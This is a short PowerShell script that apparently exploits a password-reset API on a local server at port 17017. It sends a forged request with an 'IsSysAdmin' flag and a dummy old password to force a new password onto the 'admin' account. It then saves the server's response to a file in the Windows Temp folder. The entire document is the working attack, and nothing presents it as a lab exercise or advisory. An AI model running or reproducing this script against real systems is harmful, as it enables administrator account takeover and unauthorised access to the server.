$body = @{IsSysAdmin="true";OldPassword="whatever";Username="admin";NewPassword="P@ssw0rd123!@#";ConfirmPassword="P@ssw0rd123!@#"} | ConvertTo-Json
try {
    $r = Invoke-WebRequest -Uri "http://localhost:17017/api/v1/auth/force-reset-password" -Method Post -Body $body -ContentType "application/json" -UseBasicParsing
    "STATUS:$($r.StatusCode)`nBODY:$($r.Content)" | Out-File -FilePath C:\Windows\Temp\smres.txt -Encoding ascii
} catch {
    $stream = $_.Exception.Response.GetResponseStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $body2 = $reader.ReadToEnd()
    "STATUS:$($_.Exception.Response.StatusCode.value__)`nBODY:$body2" | Out-File -FilePath C:\Windows\Temp\smres.txt -Encoding ascii
}
